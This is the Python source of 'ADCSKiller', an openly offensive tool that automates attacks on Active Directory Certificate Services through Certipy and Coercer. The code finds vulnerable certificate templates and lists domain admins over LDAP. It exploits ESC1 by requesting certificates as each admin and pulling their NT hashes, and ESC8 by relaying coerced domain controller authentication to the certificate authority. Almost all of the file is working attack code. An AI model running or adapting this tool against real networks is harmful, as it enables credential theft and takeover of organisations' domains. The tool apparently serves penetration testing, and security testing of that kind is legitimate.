#!/usr/bin/python

""" ADCS exploitation automation

This tool tries to automate the process of exploiting ADCS by weaponizing certipy. This is the first draft.

References:
https://github.com/ly4k/Certipy
https://github.com/p0dalirius/Coercer

MIT License

Copyright (c) 2023 grimlockx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

__author__ = "grimlockx"
__license__ = "MIT"
__version__ = "0.3"


import argparse
import subprocess
import re
import ldap3
import json
import re
import threading
import time
from datetime import datetime


class CertipyRelay(threading.Thread):
    def __init__(self, threadID, name, ca):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.target_ca = ca
        
    def run(self):
        print(f'[+] Started Relaying to {self.target_ca}')
        relaying_results = subprocess.Popen(["certipy", "relay", "-ca", self.target_ca, "-template", "DomainController"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        for line in relaying_results.stdout:
            print(line.strip())

        
class Coercer(threading.Thread):
    def __init__(self, threadID, name, domain, username, password, target_dc, lhost):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.domain = domain
        self.username = username
        self.password = password
        self.target_dc = target_dc
        self.lhost = lhost
        
    def run(self):
        print(f'[+] Started coercion from {self.target_dc} to {self.lhost}')
        subprocess.run(["Coercer", "coerce", "-u", self.username, "-p", self.password, "-d", self.domain, "-t", self.target_dc, "-l", self.lhost, "--always-continue"], capture_output=True, text=True).stdout
        print(f'[+] Finished coercion from {self.target_dc} to {self.lhost}')
        
class Exploit:
    def __init__(self, domain, username, password, target, lhost) -> None:
        self.__domain = domain
        self.__domain_parts = domain.split(".")
        self.__domain_cn = ''.join([f'dc={e},' for e in self.__domain_parts[:-1]]) + f'dc={self.__domain_parts[-1]}'
        self.__username = username
        self.__password = password
        self.__target = target
        self.__lhost = lhost
        self.__domain_admins = []
        self.__vulnerable_certificate_templates = {}
        self.__vulns = []
        self.__dc = []

    def get_certipy_results(self) -> bool:
        current_datetime = datetime.now()
        self.__certipy_output_prefix = current_datetime.strftime("%Y%m%d%H%M%S")

        print("[*] Trying to find vulnerable certificate templates")
        try:
            certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", self.__certipy_output_prefix], capture_output=True, text=True).stdout

            if "Got error: socket connection error while opening: timed out" in certipy_results: 
                print(f'[-] Connection to the domain controller timed out')
                print(f'[*] Retrying to find vulnerable certificate templates by using a timeout of 100 seconds')
                try:
                    certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", self.__certipy_output_prefix, "-timeout", "100"], capture_output=True, text=True).stdout
                    if "Got error: socket connection error while opening: timed out" in certipy_results: 
                        print(f'[-] Connection to the domain controller timed out')
                    if "Invalid credentials" in certipy_results:
                        print(f'[-] Invalid credentials')
                        return False
                    
                    print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')
                    return True
                
                except subprocess.CalledProcessError as e:
                    print(f'[-] Certipy command execution failed: {e.stderr}')
                    return False

            if "Invalid credentials" in certipy_results:
                print(f'[-] Invalid credentials')
                return False

            print(f'[+] Saved certipy output to {self.__certipy_output_prefix}_Certipy.json\n')
            return True

        except subprocess.CalledProcessError as e:
            print(f'[-] Certipy command execution failed: {e.stderr}')
            return False
    
    def bind_to_ldap(self) -> bool:

        servers = [
            ldap3.Server(f'ldap://{self.__target}:389', get_info=ldap3.ALL),
            ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
        ]

        for server in servers:
            protocol = 'ldap' if server.port == 389 else 'ldaps'
            print(f'[*] Trying to bind to {protocol}://{self.__target}:{server.port}')
            try:
                self.__ldap_bind = ldap3.Connection(server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
                print(f'[+] Bind to {protocol}://{self.__target}:{server.port} successful\n')
                return True
            except ldap3.core.exceptions.LDAPSocketOpenError:
                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed\n')
            except ldap3.core.exceptions.LDAPBindError:
                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, invalid credentials\n')
                return False
            except ldap3.core.exceptions.LDAPCertificateError:
                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, SSL/TLS certificate validation error\n')
                return False
            except ldap3.core.exceptions.LDAPSocketOpenError:
                print(f'[-] Binding to {protocol}://{self.__target}:{server.port} failed, connection timed out\n')
                return False

        return False

    def get_domain_admins(self) -> list:
        # Inner helper function the execute LDAP search queries
        def execute_ldap_search(search_base, search_filter, attributes):
            try:
                self.__ldap_bind.search(search_base=search_base, search_filter=search_filter, attributes=attributes)
                return self.__ldap_bind.response
            except (ldap3.core.exceptions.LDAPSocketOpenError, ldap3.core.exceptions.LDAPNoSuchObjectResult, KeyError, IndexError):
                return []

        try:
            print(f"[*] Getting Domain SID")
            response = execute_ldap_search(f'{self.__domain_cn}', '(objectClass=domain)', ['objectSID'])
            if not response:
                print(f'[-] Error while getting Domain SID')
                return []
            self.__domain_SID = response[0]['attributes']['objectSid']
            print(f"[+] Received Domain SID: {self.__domain_SID}")
        except Exception as e:
            print(f'[-] Error while getting Domain SID: {str(e)}')
            return []

        try:
            print(f"[*] Getting Domain Administrators Group Common Name of {self.__domain} using objectSID: {self.__domain_SID}-512")
            response = execute_ldap_search(f'{self.__domain_cn}', f'(&(objectCategory=group)(objectSid={self.__domain_SID}-512))', ['sAMAccountName'])
            if not response:
                print(f'[-] Error while getting Domain Administrators Group Common Name')
                return []
            self.__domain_admins_cn = response[0]['raw_attributes']['sAMAccountName'][0].decode("utf-8")
        except Exception as e:
            print(f'[-] Error while getting Domain Administrators Group Common Name: {str(e)}')
            return []

        try:
            print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name: {self.__domain_admins_cn}")
            response = execute_ldap_search(f'{self.__domain_cn}', f'(&(objectCategory=group)(cn={self.__domain_admins_cn}))', ['member'])
            if not response:
                print(f'[-] Error while getting Domain Administrators')
                self.__domain_admins = []
            else:
                for entry in response[0]['raw_attributes']['member']:
                    parsed_entry = entry.decode('utf-8').split(',')
                    self.__domain_admins.append(parsed_entry[0][3:])
        except Exception as e:
            print(f'[-] Error while getting Domain Administrators: {str(e)}')
            self.__domain_admins = []

        # Fallback LDAP search query
        if not self.__domain_admins:
            try:
                print(f"[*] Getting Domain Administrators of {self.__domain} using Common Name Domain Admins")
                response = execute_ldap_search(f'{self.__domain_cn}', f'(memberOf=cn=Domain Admins,OU=Groups,{self.__domain_cn})', ['sAMAccountName'])
                if not response:
                    print(f'[-] Error while getting Domain Administrators (fallback LDAP search)')
                    self.__domain_admins = []
                else:
                    for entry in response:
                        try:
                            self.__domain_admins.append(entry['raw_attributes']['sAMAccountName'][0].decode("utf-8"))
                        except KeyError:
                            continue
            except Exception as e:
                print(f'[-] Error while getting Domain Administrators (fallback LDAP search): {str(e)}')
                self.__domain_admins = []

        if self.__domain_admins:
            print(f'[+] Found Domain Administrators: {", ".join(self.__domain_admins)}\n')
        else:
            print(f'[-] Could not enumerate Domain Administrators\n')

    def fetch_certipy_results(self) -> dict:
        print(f"[+] Parsing certipy output {self.__certipy_output_prefix}_Certipy.json")
        try:
            with open(f"{self.__certipy_output_prefix}_Certipy.json", "r") as file:
                certipy_json = json.load(file)

        except (FileNotFoundError, IOError, json.JSONDecodeError) as e:
            print(f"[-] Error reading Certipy JSON file: {e}")
            return {}

        self.__ca = certipy_json["Certificate Authorities"]["0"]["CA Name"]
        self.__ca_dns = certipy_json["Certificate Authorities"]["0"]["DNS Name"]

        vulnerabilities = certipy_json["Certificate Authorities"]["0"].get("[!] Vulnerabilities", {})
        self.__vulns = [key for key, value in vulnerabilities.items() if value]

        if self.__vulns:
            print(f"[+] Found vulnerabilities: {self.__vulns}\n")

        templates = certipy_json['Certificate Templates']
        
        for template in templates.values():
            if "[!] Vulnerabilities" in template:
                vulnerabilities = template["[!] Vulnerabilities"]
                for i in range(1, 8):
                    if f'ESC{i}' in vulnerabilities:
                        if f'ESC{i}' not in self.__vulnerable_certificate_templates:
                            self.__vulnerable_certificate_templates[f'ESC{i}'] = []
                    
                        self.__vulnerable_certificate_templates[f'ESC{i}'].append(template["Template Name"])

        if self.__vulnerable_certificate_templates:
            print('[+] Found vulnerable certificate templates')
            for key in self.__vulnerable_certificate_templates.keys():
                print(f'[+] Certificate templates vulnerable to {key}: {" ,".join(self.__vulnerable_certificate_templates[key])}')

        print()   
        return self.__vulnerable_certificate_templates
    
    def get_dcs(self) -> None:
        print(f"[*] Getting Domaincontrollers")
        self.__ldap_bind.search(search_base = f'{self.__domain_cn}', search_filter = f'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', attributes = ['distinguishedName'])
        for entry in self.__ldap_bind.response:
            try:
                entry = entry['raw_dn'].decode("utf-8").split(',')
                self.__dc.append(f'{entry[0][3:]}.{self.__domain}')
                
            except KeyError:
                continue
                
        if self.__dc:
            print(f'[+] Found domain controllers: {", ".join(self.__dc)}\n')

    def run_exploits(self) -> None:
        certificate_exploits = {
            "ESC1": self.exploit_esc1
        }

        environment_exploits = {
            "ESC8": self.exploit_esc8
        }

        for vuln in self.__vulnerable_certificate_templates:
            if vuln in certificate_exploits:
                certificate_exploits[vuln]()

        for vuln in self.__vulns:
            if vuln in environment_exploits:
                environment_exploits[vuln]()      

    def exploit_esc1(self) -> None:
        for admin in self.__domain_admins:
            for template in self.__vulnerable_certificate_templates["ESC1"]:
                print(f"[*] Exploiting ESC1 using the {admin} account")
                print(f"[+] Requesting a certificate via RPC as {admin}")
                certipy_results = subprocess.run(["certipy", "req", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-target", self.__target, "-ca", self.__ca, "-template", template, "-upn", admin, "-out", f"{template}_{admin}"], capture_output=True, text=True).stdout
                if "Got certificate" in certipy_results:
                    print(f"[+] Got certificate for UPN {admin} and certificate template {template} and saved it as {template}_{admin}.pfx")
                    print(f"[*] Trying to get NT hash for {admin} using {template}_{admin}.pfx")

                    certipy_results = subprocess.run(["certipy", "auth", "-pfx", f"{template}_{admin}.pfx", "-domain", self.__domain, "-username", admin, "-dc-ip", self.__target], capture_output=True, text=True).stdout

                    if "Got hash for" in certipy_results:
                        nthash = re.search(r"Got hash for '.*': (\w+:\w+)", certipy_results).group(1)
                        print(f"[+] Received NT hash for {admin}: {nthash}")
    
    def exploit_esc8(self) -> None:
        if self.__ca_dns not in self.__dc: # Certificate Authority is not a domain controller
            print(f'[*] Certificate authority {self.__ca_dns} is not a domain controller')
            certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.__ca_dns)
            certipy_thread.start()
            print('[*] Sleep for 5 seconds to wait for Certipy relay setup')
            time.sleep(5)
            
            coercer_thread = Coercer(2, "CoercerThread", self.__domain, self.__username, self.__password, self.__dc[0], self.__lhost)
            coercer_thread.start()
            coercer_thread.join()
            certipy_thread.join()
            
        elif self.__ca_dns in self.__dc and len(self.__dc) >= 2:
            print(f'[*] Certificate authority is also a domain controller')
            certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.__ca_dns)
            certipy_thread.start()
            print('[*] Sleep for 5 seconds to wait for Certipy relay setup')
            time.sleep(5)

            target_dc = None
            for dc in self.__dc:
                if dc != self.__ca_dns:
                    target_dc = dc
                    break
            
            coercer_thread = Coercer(2, "CoercerThread", self.__domain, self.__username, self.__password, target_dc, self.__lhost)
            coercer_thread.start()
            coercer_thread.join()
            certipy_thread.join()
            

if __name__ == "__main__":
    print(
        """
    
        ▄▄▄      ▓█████▄  ▄████▄    ██████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███     
        ▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   
        ▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   
        ░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     
        ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   
        ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
        ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░   
        ░   ▒    ░ ░  ░ ░        ░  ░  ░  ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░    
            ░  ░   ░    ░ ░            ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░        
                ░      ░                                                               

        """)

    print("\nADCSKiller v0.3 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)\n")
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--domain', dest='domain',type=str, required=True, help='Target domain name. Use FQDN')
    parser.add_argument('-u', '--username', dest='username',type=str, required=True, help='Username')
    parser.add_argument('-p', '--password', dest='password',type=str, required=True, help='Password')
    parser.add_argument('-dc-ip', '--target', dest='target',type=str, required=True, help='IP Address of the domain controller.')
    parser.add_argument('-L', '--lhost', dest='lhost',type=str, required=True, help='FQDN of the listener machine - An ADIDNS is probably required')
    args = parser.parse_args()

    exploit = Exploit(args.domain, args.username, args.password, args.target, args.lhost)
    if exploit.get_certipy_results():
        if exploit.bind_to_ldap():
            exploit.get_domain_admins()
            exploit.get_dcs()
            exploit.fetch_certipy_results()
            exploit.run_exploits()
